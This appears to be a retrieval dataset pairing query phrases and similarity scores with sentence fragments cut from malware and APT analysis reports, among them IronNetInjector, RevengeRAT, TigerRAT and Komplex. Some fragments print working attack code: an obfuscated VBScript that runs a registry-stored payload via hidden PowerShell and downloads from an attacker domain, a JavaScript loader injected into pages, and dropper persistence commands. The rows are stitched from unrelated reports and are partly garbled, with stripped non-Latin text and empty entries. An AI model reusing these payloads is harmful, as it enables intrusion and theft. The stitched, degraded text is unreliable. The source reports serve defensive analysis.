uploaded by the same submitter or the other submitters are connected and gives the assumed embedded malware:SubmitterIronPython script(s) uploadsRelated samples uploaded by same submitterPayload assumptions1 prophile.py profilec.py IronPython-2.7.7z: Portable IronPython version that contains the two IronPython scripts and a Windows task XML to start profilec.py prophile.py: .NET injector (variant 2018) + RPC backdoor variant profilec.py: .NET injector (variant 2019) + ComRAT variant2 profile.py- profile.py: .NET injector (variant 2019) + ComRAT variant3 10profilec.py 120profilec.py 220profile.py- 10profilec.py: .NET injector (variant 2018) + ComRAT variant 120profilec.py: .NET injector (variant 2019) + ComRAT variant 220profile.py: .NET injector (variant 2018) + Unknown4 profilec.py NetInjector.dll: .NET injector (variant 2019), most likely embedded .NET injector in profilec.py of same submitter payload.exe: ComRAT v4 variant (DLL), most likely embedded in profilec.py of same submitter-5- part_1.data: .NET injector (variant 2018), most likely embedded in prophile.py of submitter 1 part_2.data: RPC backdoor variant, most likely embedded in prophile.py of submitter 1 part_3.data: RPC backdoor variant, most likely embedded in prophile.py of submitter 1-Table 1.', 'Categorized IronPython samples according to VirusTotal submitters and their assumed payloads.It becomes clear that IronNetInjector is mostly used to loadComRAT.', 'In one case, a variant of the RPC backdoor is used and in another a payload that we couldnt associate with known malware.We also couldnt verify how the IronPython scripts get run in the first place.']
the Rijndael decryption key is passed.|0.8290973040205412|['Categorized IronPython samples according to VirusTotal submitters and their assumed payloads.It becomes clear that IronNetInjector is mostly used to loadComRAT.', 'In one case, a variant of the RPC backdoor is used and in another a payload that we couldnt associate with known malware.We also couldnt verify how the IronPython scripts get run in the first place.', 'One of the submitters uploaded a 7-Zip archive with the contents of the IronPython MSI file of version 2.7.0.40 from 2011.', 'This archive also contains two IronPython scripts (see table) and a Windows task XML file namedmssch.xmlwith the following content:Figure 2.', 'Windows task XML file for IronNetInjector.The task is used to start an IronPython script with the 64-bit version of the interpreter.', 'As a command line argument, the Rijndael decryption key is passed.', 'However, the key didnt decrypt on any of the embedded files in the scripts we found.', 'The tasks description isPythonUpdateSrvcand it runs either on Windows startup when a user logs in or when one of two system events get created:Figure 3.', 'IronNetInjector task triggers.Depending on the system, the event withID 8001belongs to Microsoft Internet Information Services (IIS), Microsoft Exchange Server or Windows Server (Source:Netsurion EventTracker).', 'The other event with ID 5324 is likely related to the logoff from Winlogon.', 'Both triggers only happen when these events appear in theMicrosoft-Windows-GroupPolicy(/Operational)event logs.When we consider that the files in the 7-Zip archive were all taken from the same directory, we can make some assumptions.']
The task file is then used to create a task which in turn starts a script when triggered.|1.0000000000000002|['IronNetInjector task triggers.Depending on the system, the event withID 8001belongs to Microsoft Internet Information Services (IIS), Microsoft Exchange Server or Windows Server (Source:Netsurion EventTracker).', 'The other event with ID 5324 is likely related to the logoff from Winlogon.', 'Both triggers only happen when these events appear in theMicrosoft-Windows-GroupPolicy(/Operational)event logs.When we consider that the files in the 7-Zip archive were all taken from the same directory, we can make some assumptions.', 'The attacker might have used the IronPython MSI to install the interpreter toC:\\\\ProgramData\\\\IronPython-2.7on the victims system.', 'The IronPython scripts and the Windows task XML were placed in the same directory.', 'The task file is then used to create a task which in turn starts a script when triggered.', 'However, its also possible that the submitter collected the files from different places and just bundled them into an archive for scanning purposes.', 'Its also unclear why the attacker would use such an old version of IronPython.A Brief WalkthroughLets go briefly through the execution flow based on one of the scripts of VirusTotal submitter 4 that contains the 2019 variant of the injector and a ComRAT variant (SHA256:3aa37559ef282ee3ee67c4a61ce4786e38d5bbe19bdcbeae0ef504d79be752b6).When an IronPython script is run, it is loaded into the IronPython interpreter.', 'In the IronPython script, the embedded .NET injector (SHA256:a56f69726a237455bac4c9ac7a20398ba1f50d2895e5b0a8ac7f1cdb288c32cc) and ComRAT DLL payload (SHA256:a62e1a866bc248398b6abe48fdb44f482f91d19ccd52d9447cda9bc074617d56) get decoded and decrypted.', 'This is done with the Python Base64 module and the RijndaelManaged class from the C# cryptography namespace.', 'The decryption key is passed as an argument to the IronPython script.']
The output is then parsed to the targeted process ID with the help of tasklist filters.|1.0000000000000002|"['Next, the .NET injector gets loaded into the IronPython process with the help of theAssembly.Load()method of the C# Reflection namespace.', ""That's possible because IronPython itself is a .NET assembly and thus its process already contains all the .NET runtime libraries.After the injector assembly is loaded, the ID of the process where the ComRAT DLL gets injected is retrieved."", 'In this case, theexplorer.exewas chosen.', 'This routine to get the PID slightly differs in the IronPython scripts we found.', 'While one script uses the C# methodGetProcessesByName()to get the PID, the other scripts run the Windows tool tasklist.exe with the help of the Pythonos.popen()function.', 'The output is then parsed to the targeted process ID with the help of tasklist filters.', 'Also, some scripts filter the PID based on a Windows service name.', 'When the PID is found, an instance of the injector assembly is created and the ComRAT payload bytes and PID are passed.Figure 4.', ""PID retrieval function variations in the different IronPython scripts.Finally, the injector's public methodsInvoke()andInvokeVoid()get called."", 'In the latter, the exported function name VFEP of the ComRAT payload gets passed.', 'From this point on, the .NET injector takes control over the further execution.The .NET injector contains the following namespaces:DefaultSerializerPeNetPeNet.ParserPeNet.StructuresPeNet.Structures.MetaDataTablesPeNet.Structures.MetaDataTables.ParsersPeNet.UtilitiesWhile the PeNet code is copied from the project, the namespaceDefaultSerializercontains the injector code and is made of the following classes:DefaultSerializer: Contains the injector code.NetBootstrapper: Contains 32-/64-bit bootstrappers to load an assembly into an unmanaged process.Win32: Contains the imported unmanaged function declarations and win32 structures/constants.The DefaultSerializer class exposes four public methods:InjectAssemblyInvokeInvokeAssemblyMethodInvokeVoidThese methods are used pairwise.']"
Windows Management Instrumentation (WMI).|0.8057967280091354|"['Its mainly used by red teams in IT security but also misused across the spectrum of APT actors, e.g.', 'Lazarus Group, Telebots, Okrum etc.', 'After running it in a test virtual environment, its output is (the incorrect spaces before the commas are in the original): 1 #1 domain = MSEDGEWIN10, user = Administrator , nthash=FC525C9683E8FE067095BA2DDC971889.', '2 #2 domain = MSEDGEWIN10, user = IEUser , nthash=FC525C9683E8FE067095BA2DDC971889.', 'Lateral movement via WMI The attackers use an additional tool to spread in the hosting network.', 'This time they leverage Windows Management Instrumentation (WMI).', 'All relevant data is needed as the files name, as during the execution it expects @@<ComputerName>,<UserName>,<Password>,.exe.', 'In the first step, a console to a remote computer is established, where the connection is identified by <ComputerName> and authenticated with (<UserName>, <Password>).', 'Afterwards, proxy https://www.welivesecurity.com/2020/05/14/mikroceen-spying-backdoor-high-profile-networks-central-asia/ 3/75/15/2020 Mikroceen: Spying backdoor leveraged in high-profile networks in Central Asia | WeLiveSecurity security is set to the strict level, which means arguments of each remote procedure call are encrypted and the servers access to local resources is allowed.', 'Then WMI is used again to retrieve the Win32_Process class, which in turn is used to create a process with given parameters.', 'When all the work is done, the tool terminates itself.']"
Windows Management Instrumentation (WMI).|0.8057967280091354|['A PDB string in the Mimikatz payloadMimikatz is an open source project by French security researcher Benjamin Delpy, developed since 2007.', 'Its a robust tool that, among other things, can bypass various Windows authentication schemes, basically by dumping credential data from the Windows Local Security Account database.', 'Its mainly used by red teams in IT security but also misused across the spectrum of APT actors, e.g.Lazarus Group,Telebots,Okrumetc.', 'After running it in a test virtual environment, its output is (the incorrect spaces before the commas are in the original):#1 domain = MSEDGEWIN10, user = Administrator , nthash=FC525C9683E8FE067095BA2DDC971889.', '#2 domain = MSEDGEWIN10, user = IEUser , nthash=FC525C9683E8FE067095BA2DDC971889.Lateral movement via WMIThe attackers use an additional tool to spread in the hosting network.', 'This time they leverage Windows Management Instrumentation (WMI).', 'All relevant data is needed as the files name, as during the execution it expects@@<ComputerName>,<UserName>,<Password>,.exe.In the first step, a console to a remote computer is established, where the connection is identified by<ComputerName>and authenticated with (<UserName>, <Password>).', 'Afterwards, proxy security is set to the strict level, which means arguments of each remote procedure call are encrypted and the servers access to local resources is allowed.', 'Then WMI is used again to retrieve theWin32_Process class, which in turn is used to create a process with given parameters.', 'When all the work is done, the tool terminates itself.Gh0st RATThisinfamous, old RATwas created around 2008.', 'In this instance it was found asrastls.dllon the compromised systems, while the exported DLL name is usuallysvchost.dll.']
loaded using rundll32.exe.|0.7572761231933577|"['Visual Basic Script hidden behind the web page Its funny to see the malware author tried to attribute the paternity of the script to Microsoft Corp., adding pieces of comments belonging to legit Microsoft utilities: 3/11Update Copyright: Microsoft Corp.', 'This script is designed to be used only for scheduled tasks(s).', 'There is no extensive error check, and will not dump the output from the Powershell CmdLet.', 'Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)} These comments are in fact part of the SyncAppvPublishingServer utility, commonly deployed into Windows 10 machines at C:\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.vbs.', 'Anyway, the remaining part of the script is responsible to execute a series of malicious actions: Store a base64 encoded version of the RevengeRAT payload into registry key located at HKCU\\\\AppEvents\\\\Values CreateObject(""Wscript.Shell"").regwrite ""HKCU\\\\AppEvents\\\\Values"", ""TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]"" , ""REG_SZ"" Decode and execute of the stored payload Set A0102030405 = CreateObject(""WScript.Shell"") Dim CDT0908087CDT CDT0908087CDT = ""cmd.""', '+ ""exe /C rundll32.""', '+ ""exe javascript:""""\\\\..\\\\mshtml,RunHTMLApplication """";document.write();h=new%20ActiveXObject(""""WScript.Shell"""").run(""""cmd.""', '+ ""exe /c power"" + ""shell -"" + ""Execution"" + ""Policy Bypass -windows"" + ""tyle hidden -noexit -Command [Reflection.""', '+ ""Assembly]::Load([Convert]::FromBase64String((Get- ItemProperty HKCU:\\\\AppEvents).Values)).EntryPoint"" + "".Invoke($N"" + ""ull,$"" + ""Null)"""",0,true);"" A0102030405.run CDT0908087CDT, vbHide Create and execute another VBScript into %AppData%\\\\Local\\\\Temp\\\\Z3j.vbs, capable to download a new payload from the remote destination hxxp://cdtmaster.com[.', ']br Set XbonXo = CreateObject(""WScript.Shell"") Dim XoowA83AC XoowA83AC = ""c"" + ""M"" + ""d /c cd %TEMP% &@echo Z6h = """"h"" + ""t"" + ""tp://cdtmaster.com.br/Document.""', '+ ""mp3"""">>Z3j.vbs &@echo M2l = M5t(""""R]Qc[S\\\\b<SfS"""")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t("""" [af[Z@<f[ZVbb^""""))>>Z3j.vbs &@echo M1s.Open M5t(""""USb""""), Z6h, False>>Z3j.vbs &@echo M1s.send ("""""""")>>Z3j.vbs &@echo Set E3i = CreateObject(M5t(""""OR]RP<ab`SO[""""))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo E3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo E3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo E3i.Close>>Z3j.vbs &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To Len(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k = Chr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs &@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs & timeout 2 & DOCUMENT.EXE"" XbonXo.Run XoowA83AC, vbHide 4/11Finally, the creation of a new task running again the mshta.exe utiliy with the hxxps://pocasideiascdt.blogspot[.']"
loaded using rundll32.exe.|0.7572761231933577|"[']com shormanz[.', ']com verofes[.', ']com : 2/3rundll32 C:\\\\Windows\\\\Tasks\\\\pe.dll,DllRegisterServer C:\\\\Windows\\\\Tasks\\\\pe.dll : 1.', '(EXCEL.EXE, WINWORD.EXE )  (, rundll32.exe, wscript.exe ).', ""2.    '"", 'rundll32.exe.', ': 3/3']"
loaded using rundll32.exe.|0.7572761231933577|"['Home page of the Blogger drop urlBut a deeper inspection of its source code reveals an interesting snippet inserted into an invisible blog post: this ghost article contains VBScript code.Figure 4.', ""Visual Basic Script hidden behind the web pageIts funny to see the malware author tried to attribute the paternity of the script to Microsoft Corp., adding pieces of comments belonging to legit Microsoft utilities:'Update---------------------------------------------------------------------------------------------' Copyright: Microsoft Corp.'' This script is designed to be used only for scheduled tasks(s).'"", ""There is no extensive error check, and will not dump the output from the Powershell CmdLet.''"", 'Usage: SyncAppvPublishingServer {cmdline-args(passthrough to cmdlet)}These comments are in fact part of the SyncAppvPublishingServerutility, commonly deployed into Windows 10 machines at C:\\\\Windows\\\\System32\\\\SyncAppvPublishingServer.vbs.', 'Anyway, the remaining part of the script is responsible to execute a series of malicious actions:Store a base64 encoded version of the RevengeRAT payload into registry key located at""HKCU\\\\AppEvents\\\\Values""CreateObject(""Wscript.Shell"").regwrite ""HKCU\\\\AppEvents\\\\Values"", ""TVqQAAMAAAAEAAAA//8AALgAAA.....[continue]"" , ""REG_SZ""Decode and execute of the stored payloadSet A0102030405 = CreateObject(""WScript.Shell"") Dim CDT0908087CDT CDT0908087CDT = ""cmd.""', '+ ""exe /C rundll32.""', '+ ""exe javascript:""""\\\\..\\\\mshtml,RunHTMLApplication """";document.write();h=new%20ActiveXObject(""""WScript.Shell"""").run(""""cmd.""', '+ ""exe /c power"" + ""shell -"" + ""Execution"" + ""Policy Bypass -windows"" + ""tyle hidden -noexit -Command [Reflection.""', '+ ""Assembly]::Load([Convert]::FromBase64String((Get-ItemProperty HKCU:\\\\AppEvents).Values)).EntryPoint"" + "".Invoke($N"" + ""ull,$"" + ""Null)"""",0,true);"" A0102030405.run CDT0908087CDT, vbHideCreate and execute another VBScript into %AppData%\\\\Local\\\\Temp\\\\Z3j.vbs,capable to download a new payload from the remote destination hxxp://cdtmaster.com[.', ']brSet XbonXo = CreateObject(""WScript.Shell"") Dim XoowA83AC XoowA83AC = ""c"" + ""M"" + ""d /c cd %TEMP% &@echo Z6h = """"h"" + ""t"" + ""tp://cdtmaster.com.br/Document.""', '+ ""mp3"""">>Z3j.vbs &@echo M2l = M5t(""""R]Qc[S\\\\b<SfS"""")>>Z3j.vbs &@echo Set M1s = CreateObject(M5t(""""[af[Z@<f[ZVbb^""""))>>Z3j.vbs &@echo M1s.Open M5t(""""USb""""), Z6h, False>>Z3j.vbs &@echo M1s.send ("""""""")>>Z3j.vbs &@echo Set E3i = CreateObject(M5t(""""OR]RP<ab`SO[""""))>>Z3j.vbs &@echo E3i.Open>>Z3j.vbs &@echo E3i.Type = 1 >>Z3j.vbs &@echo E3i.Write M1s.ResponseBody>>Z3j.vbs & @echo E3i.Position = 0 >>Z3j.vbs &@echo E3i.SaveToFile M2l, 2 >>Z3j.vbs &@echo E3i.Close>>Z3j.vbs &@echo function M5t(N3y) >> Z3j.vbs &@echo For S2r = 1 To Len(N3y) >>Z3j.vbs &@echo E0k = Mid(N3y, S2r, 1) >>Z3j.vbs &@echo E0k = Chr(Asc(E0k)- 14) >>Z3j.vbs &@echo G3f = G3f + E0k >> Z3j.vbs &@echo Next >>Z3j.vbs &@echo M5t = G3f >>Z3j.vbs &@echo End Function >>Z3j.vbs& Z3j.vbs &dEl Z3j.vbs & timeout 2 & DOCUMENT.EXE"" XbonXo.Run XoowA83AC, vbHideFinally, the creation of a new task running again the mshta.exe utiliy with the hxxps://pocasideiascdt.blogspot[.']"
loaded using rundll32.exe.|0.7572761231933577|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs  2019   Positive Technologies (PT Expert Security Center, PT ESC)  ,   - .', '.', '2020      .', ',  ,      .', '2021 PT Expert Security Center  .', '.', '.']
The decryption algorithm|0.7618543230074822|['If the input argument is addr(0x11223344), first add 4 to the value to get 0x11223348, and then set the variant type to 8 (string type).', 'Next, call len function: if found to be BSTR type, vbscript will assume that the forward 4 bytes (0x11223344) is the address memory to store the length.', 'So the len function will be executed and the value of the specified memory address will be returned.', 'Obtain Key DLL Base Address 1.', 'The attacker leaks the virtual function table address of the CScriptEntryPoint object in the following way, which belongs to Vbscript.dll.', '1.', 'Obtain the vbscript.dll base address in the following way.', '1.', 'Because vbscript.dll imported msvcrt.dll, the msvcrt.dll base address was obtained by traversing the vbscript.dll import table, msvcrt.dll introduces kernelbase.dll, ntdll.dll, and finally the NtContinue, VirtualProtect function address was obtained.', 'Save web pages as PDF with PDFmyURLBypass DEP to execute shellcode 1.', 'Use arbitrary reading and writing technique to modify the VAR type type to 0x4d, and then assign it with a value of 0 to make the virtual machine perform VAR:: Clear function.']
The decryption algorithm|0.791515393227727|['The set of Trojans is powerful, with keyboard recording, voice recording, screen capture, file capture and U disk operation functions, etc.', 'The Lucker s name comes from the PDB path of this type of Trojan, because most of the backdoors function use the LK abbreviation.In the middle to late period we have discovered its evolution and two different types of backdoor programs.', 'We have named them Retro and Collector by the PDB path extracted from the program.', 'The Retro backdoor is an evolution of the Lucker backdoor and it actives in a series of attacks from 2016 till now.', 'The name comes from the pdb path of this type of Trojan with the label Retro, and also has the word Retro in the initial installer.C:\\\\workspace\\\\Retro\\\\DLL-injected-explorer\\\\zlib1.pdbC:\\\\workspace\\\\Retro\\\\RetroDLL\\\\zlib1.pdbThe evolution of the reflective DLL injection technique can be found from the relevant PDB paths, and there are a lot of variants of this series of backdoors.VII Attribution1.', 'Decryption AlgorithmDuring the analysis, we found the decryption algorithm that malware used is identical to APT-C-06s decryption algorithm.The decryption algorithm of this attack is as follow:The decryption algorithm APT-C-06 used is as follow:In the further analysis, we found the same decryption algorithm was used in the 64-bit version of the relevant malware.2.', 'PDB PathThe PDB path of the malware used in this attack has a string of Retro.', 'It is one specific feature of Retro Trojan family.3.', 'VictimsIn the process of tracing victims, we found one special compromised machine.', 'It has a large amount of malware related to APT-C-06.', 'By looking at these samples in chronological order, the evolution of the malicious program can be clearly seen.']
Process Hollowing|0.7603834516570751|"['If the browser version contains a vulnerability, corresponding exploitation code gets run on the target system, potentially giving the attacker a remote code execution ability.', 'For these types of attacks, adversaries often leverage JavaScript.', 'For instance, according to a malware analysis report performed by Palo Alto, analyzing threat samples from April 2022 to June 2022, among all of the web threats detected during the research, JavaScript downloaders and redirectors were in the top 5 most leveraged web threats, infecting around 300 different domains [31].', 'Analysis shows that attackers often inject malicious JavaScript downloaders to a webpage owned by them, creating several new script elements that redirect website visitors to ads, spams, or any other malicious domains such as train[.]developfirstline[.', ']com: .', '.', '.', 'Element.prototype.appendAfter = function(element) { element.parentNode.insertBefore(this, element.nextSibling) ), false(function () { var elem = document.createElement(\'script"") elem.type = \'text / javascript\' elem.sc = \'https://train.developfirstline.com/delivery.js?s=3\' elem.appendAfter(document.getElementsByTagName(\'script\')(0]) elem.appendAfter(document.getElementsByTagName(""\'head\')[0]) document.getElementsByTagName(\'head\')(01.appendChild(elem) .', '.', '.', '37#1.8.']"
Upload a screen capture|0.8425630962555459|"[""TigerRAT The second implant hosted on MagicRAT's C2 is a remote access trojan (RAT) known as TigerRAT."", 'TigerRAT is an implant disclosed in 2021 by KISA and KRCERT as part of ""Operation ByteTiger\'\' detailing TigerRAT and its downloader ""TigerDownloader.""', 'This implant consists of several RAT capabilities, ranging from arbitrary command execution to file management.', 'Capabilities of the implant include: Gather system information: username, computer name, network interface info, system info including product and version.', 'Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe 6/12Implant capability to run arbitrary commands.', 'Screen capture.', 'Socks tunneling.', 'Keylogging.', 'File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes, Self delete/uninstall from system.', 'The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon.', 'One of these capabilities is called ""USB dump.""']"
the keylogging utility|0.7555177043868438|"['This implant consists of several RAT capabilities, ranging from arbitrary command execution to file management.', 'Capabilities of the implant include: Gather system information: username, computer name, network interface info, system info including product and version.', 'Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe 6/12Implant capability to run arbitrary commands.', 'Screen capture.', 'Socks tunneling.', 'Keylogging.', 'File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes, Self delete/uninstall from system.', 'The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon.', 'One of these capabilities is called ""USB dump.""', ""The authors have also created skeleton code in preparation for implementing video capture from Web cameras, though it hasn't been implemented yet."", 'USB Dump The USB Dump capability gives the attackers the ability to: 7/12Enumerate files for path ""LOCAL_APPDATA\\\\GDIFONTC"".']"
keylogger|0.7541122277971726|[]
keylogger|0.7901584262715234|[]
keylogger|0.8265048709580344|[]
keylogger|0.8631785412921766|['The MSVS project SVCHOST compiles/creates the SVCHOST.DLL binary.', 'The RESSDT.SYS binary is placed in its resource section.', '3.', 'The MSVS project INSTALL compiles/creates the INSTALL.EXE binary.', 'The SVCHOST.DLL binary is placed in its resource section.', '4.', 'The MSVS project GH0ST compiles/creates the GH0ST.EXE binary.', 'The INSTALL.EXE binary is placed in its resource section.', '5.', 'The GH0ST.EXE application is used to configure a custom Gh0st server binary (See Gh0st RAT Operation section).', 'When the Generate button on the Build tab is clicked, the INSTALL.EXE binary is extracted from its own resource section and saved to disk (default name is SERVER.EXE).']
keylogger|0.7758967193998954|['0xA4 NOP S Does nothing.', 'Possibly an unimplemented or deleted function.', '0xA5 Delete registry key S Deletes a registry key.', 'Can be a subkey.', 'Packet contains: [4] - Registry key name length [var] - Registry key name Returns success or failure with parameters 6/6.', '0xB6 Keylogger response C Sends keylogger data from the keylogger buffer file.', 'Keylogger data: [4] - Length [1] - All bytes read?', '1 or 0 [var] - Keylogger data Parameters are set to the output of function 4 in the class C vtable?', '0xB8 Keylogger data request S Requests keylogger data in a 0xB6 packet.CITIZEN LAB TECHNICAL BRIEF: IEXPL0RE RAT 30 0xC8 Unknown - get a screen- S Looks suspiciously like taking a screenshot.', 'shot?', 'Packet contains: [2] - Unknown [2] - Unknown [1] - Unknown Replies with failure or success with parameters 8/8.']
keylogger|1.0|['This version consists of multiple RAT capabilities, additional plugins and a variety of detection-evasion techniques.', 'In the past, CRAT has been attributed to the Lazarus Group, the malicious threat actors behind multiple cyber campaigns, including attacks against the entertainment sector.', 'https://blog.talosintelligence.com/2020/11/crat-and-plugins.html 1/3211/13/2020 Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: CRAT wants to plunder your endpoints Indicators and tactics, techniques and procedures (TTPs) discovered by this investigation resemble those of the Lazarus Group.', 'How did it work?', 'The attack consists of a highly modular malware that can function as a standalone RAT and download and activate additional malicious plugins from its C2 servers.', 'Cisco Talos has discovered multiple plugins so far, consisting of ransomware, screen-capture, clipboard monitoring and keylogger components.', 'So what?', 'This attack demonstrates how the adversary operates an attack that: Uses obfuscation and extensive evasion techniques to hide its malicious indicators.', 'Has evolved across versions to achieve effectiveness of their attack.', 'Employs a highly modular plugin framework to selectively infect targeted endpoints.', 'Most importantly, it deploys RAT malware to ransack the endpoint, followed by deployment of ransomware to either extort money or burn infrastructure of targeted entities.']
keylogger|0.8997042809306331|['The Mac version shares multiple similarities with those designed for other operating systems.', 'However, the Mac agent brings more spying capabilities such as stealing iOS backups from Mac computers, which contain messages, contacts, voicemail, call history, notes, calendar and Safari data.', 'B.', 'Attack Flow Last year on 26 of September, PaloAlto identified a new Mac OS X Trojan associated with the APT28/Sofacy group that received the Komplex name.', 'The Komplex Trojan is a binder with multiple parts: a dropper, a payload and a decoy pdf file.', '1.', 'The Komplex Binder: Is the main executable of roskosmos_2015-2025.app.', 'Its main purpose is to save a second payload(the dropper) on the system and open the decoy pdf file pictured below.', 'v7 = objc_msgSend(&OBJC_CLASS___NSString, stringWithFormat:, CFSTR(%@/roskosmos_2015-2025.pdf), v6); v8 = objc_msgSend(&OBJC_CLASS___NSString, stringWithFormat:, CFSTR(SetFile -a E %@/ roskosmos_2015-2025.pdf), v6); v9 = objc_msgSend(&OBJC_CLASS___NSString, stringWithFormat:, CFSTR(rm -rf %@/roskosmos_2015-2025.', 'app), v6); v10 = objc_msgSend( &OBJC_CLASS___NSString, stringWithFormat:, CFSTR(open -a Preview.app %@/roskosmos_2015-2025.pdf), v6); v11 = objc_msgSend(&OBJC_CLASS___NSData, dataWithBytes:length:, &joiner, 135028LL); objc_msgSend(v11, writeToFile:atomically:, CFSTR(/tmp/content), 1LL); v12 = (const char *)objc_msgSend(v9, UTF8String); system(v12); system(chmod 755 /tmp/content); v13 = objc_msgSend(&OBJC_CLASS___NSData, dataWithBytes:length:, &pdf, 1584258LL); objc_msgSend(v13, writeToFile:atomically:, v7, 1LL); v14 = (const char *)objc_msgSend(v8, UTF8String); system(v14); v15 = objc_msgSend(&OBJC_CLASS___NSTask, alloc); v16 = objc_msgSend(v15, init); objc_msgSend(v16, setLaunchPath:, CFSTR(/tmp/content)); objc_msgSend(v16, launch); objc_msgSend(v16, waitUntilExit); v17 = (const char *)objc_msgSend(v10, UTF8String); system(v17); The Komplex Binder [4]White Paper Komplex: roskosmos_2015-2025.pdf 2.', 'The Komplex Dropper: Its main functionality is to drop a third Komplex component: the final payload, and ensure persistence on the infected system system(mkdir -p /Users/Shared/.local/ &> /dev/null); system(mkdir -p ~/Library/LaunchAgents/ &> /dev/null); off_10001B4F0(v5, &off_10001B4F0, CFSTR(/Users/Shared/.local/kextd), 1LL); off_10001B4F0(v6, &off_10001B4F0, CFSTR(/Users/Shared/com.apple.updates.plist), 1LL); off_10001B4F0(v7, &off_10001B4F0, CFSTR(/Users/Shared/start.sh), 1LL); system(cp /Users/Shared/com.apple.updates.plist $HOME/Library/LaunchAgents/ &>/dev/null); remove(/Users/Shared/com.apple.updates.plist); system(chmod 755 /Users/Shared/.local/kextd); system(chmod 755 /Users/Shared/start.sh); 3.']
keylogger|1.0|['Amadey.', '3.3.', 'Latest Attack Cases.. 3.3.1.', 'AutoIt Amadey.. 3.3.2.', 'RftRATPost-infection.', '4.1.', 'Keylogger.', '4.2.', 'Infostealer.', '4.3.', 'Other TypesConclusion1.']
decryption.|0.8598297776050206|"['This indicates that the Mafalda implant is a maintained, ongoing project.', 'The figures below depict the functions in the older and the newer Mafalda variant that handle the processing of the different backdoor commands based on the command number.', 'Fig 8: Older Mafalda variant: Processing of backdoor commands THE MYSTERY OF METADOR | AN UNATTRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 13Fig 9: Newer Mafalda variant: Processing of backdoor commands THE MYSTERY OF METADOR | AN UNATTRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 14 1 https://attack.mitre.org/software/S0073//The full unobfuscated list of commands, along with the developers descriptions, are available in the Mafalda section of the Technical Appendix.', 'The following functionality is only available in the newer Mafalda variant: Network and system configuration reconnaissance.', 'Information theft and implant orchestration.', 'Data decryption.', 'Filesystem operations.', 'The following is a summary of some of the newer Mafalda commands: Command 60 Reads the content of the file %USERPROFILE%\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Local State and sends the file content to the C2 server as part of a packet with a name prefixed with loot\\\\.', 'The Local State file stores security-relevant data, such as an encryption key that Chrome uses to protect cookies.', 'The environment variable %USERPROFILE% expands to the path to the profile folder of the user in whose context Mafalda runs, such as C:\\\\Users\\\\test for the user test.', 'Command 61 Decrypts attacker-provided data using the DPAPI (Data Protection Application Programming Interface) key of the platform where Mafalda runs.']"
decryption.|0.7786906640410152|"['{ 3. meta: 4.', '5. description = ""Detects obfuscation patterns used in HALFRIG.', 'This rule wasn\'t tested against large dataset, it should be used for threat hunting and not on services like VTI.""', '6.', '7. strings: 8.', '// Decryption constants and decryption operation 9.', '$ = {48 BB 0B 91 09 19 4D FD 9B F3 } 10.', '11.', '$ = {4D 8D 40 01 48 8B CA 48 8B C2 48 C1 E9 38 48 83 C9 01 48 C1 E0 08 48 8B D1 48 33 D0} 12.', '13.', '$ = {C7 05 [3] 00 F7 91 4D 01 } 14.']"
"store
a file named update.lnk in the %APPDATA%\Microsoft\Windows\Start
Menu\Programs\Startup\ directory"|0.7678269277263368|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
"passed as an argument on the
command line."|0.7501135260458802|['The randomly chosen service name is used to name the dropped file and newly registered Windows service.', 'Lets refer to this randomly chosen service name as [service].', 'The malware contains references to several files inside: The file passed as argument: contains a 16-byte key msncf.dat: Encrypted configuration data msndll.tmp: Encrypted Fallchill loader msndll.dat: Encrypted Fallchill backdoor (payload for the loader) [service]svc.dll: Fallchill backdoor loader [service].dat: Copy of msndll.dat A mix of the above-mentioned files produces the final backdoor known as Fallchill.', 'A more detailed procedure for technical specialists is as follows: 1.', 'Check whether the command-line argument points to a file of 16 byte size.', '2.', 'Read the file passed via the command-line argument.', 'The contents of this file contains a crypto key, which we will call the main key.', '3.', 'Open the msncf.dat file (configuration file).', 'If the file size equals 192 bytes, read the content of the file.']
